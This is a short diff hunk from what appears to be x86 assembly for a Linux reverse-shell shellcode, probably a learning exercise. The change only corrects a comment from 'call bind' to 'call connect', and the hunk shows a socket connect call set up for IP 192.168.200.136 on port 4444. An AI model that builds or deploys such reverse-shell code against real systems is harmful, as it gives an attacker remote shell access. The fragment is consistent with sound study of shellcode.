@@ -40,7 +40,7 @@ dup2:
 	;call connect
 	xor ebx, ebx ;clear ebx
 	mov ebx, esi ;set sockfd to the returned 
-	mov ax, 362 ;call bind
+	mov ax, 362 ;call connect
 	push edi
 	push dword 0x88c8a8c0 ;192.168.200.136 in hex c0.a8.c8.88 (0xc0a8c888)
 	push word 0x5c11 ;port 4444
